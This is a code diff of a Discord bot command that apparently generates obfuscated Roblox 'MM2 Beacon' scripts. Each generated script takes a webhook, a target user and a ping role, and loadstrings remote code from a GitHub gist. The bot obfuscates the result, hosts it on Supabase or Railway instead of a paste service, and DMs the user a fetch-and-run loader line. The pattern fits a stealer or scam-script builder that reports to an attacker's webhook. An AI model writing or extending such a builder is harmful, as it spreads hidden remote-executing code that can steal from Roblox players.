@@ -1,4 +1,5 @@
 import { obfuscate } from '../services/methylone.js';
+import { saveScript } from '../services/supabase.js';
 import { ModalBuilder, TextInputBuilder, TextInputStyle, ActionRowBuilder } from 'discord.js';
 
 export const data = {
@@ -54,7 +55,7 @@ export async function execute(interaction) {
 _G.YOUR_WEBHOOK = '${webhook}'
 _G.TARGET_USER = '${target}'
 _G.PING_ROLE_ID = '${pingRole}'
-loadstring(game:HttpGet('https://gist.githubusercontent.com/malik020859-ui/9fd33a4b9399bbb8f038b9dfc2223ed9/raw/8d43622c9f56b3791e09df782d62ba85f0222101/gistfile1.txt', true))()
+loadstring(game:HttpGet('https://gist.githubusercontent.com/malik020859-ui/a7348c340afc847b43c20e09bf78d445/raw/cd242a9edf1d021d926dd1ab65780a67104d6b5b/ANTIWARES', true))()
 `;
 
   // Defer the reply
@@ -67,27 +68,16 @@ loadstring(game:HttpGet('https://gist.githubusercontent.com/malik020859-ui/9fd33
     return submitted.editReply(`❌ Failed to obfuscate: ${err.message}`);
   }
 
-  // Save to Rubis
-  const apiUrl = `https://api.rubis.app/v2/scrap?public=true&title=${encodeURIComponent('MM2 Beacon Script')}`;
-
-  const pasteResponse = await fetch(apiUrl, {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'text/plain',
-    },
-    body: obfuscated,
-  });
-
-  if (!pasteResponse.ok) {
-    const errorText = await pasteResponse.text();
-    console.error('Rubis error:', errorText);
-    return submitted.editReply(`❌ Failed to host script on Rubis: ${pasteResponse.status} ${pasteResponse.statusText}`);
+  // Save to Supabase (Railway will serve it)
+  let id;
+  try {
+    id = await saveScript(obfuscated);
+  } catch (err) {
+    return submitted.editReply(`❌ Failed to save script: ${err.message}`);
   }
 
-  const pasteData = await pasteResponse.json();
-  const id = pasteData.scrapID;
-
-  const loadstring = `loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/${id}/raw"))()`;
+  // Railway URL — replace with your actual Railway domain
+  const loadstring = `loadstring(game:HttpGet("https://antiwares-production.up.railway.app/api/public/s/${id}"))()`;
 
   // Send to DMs
   try {
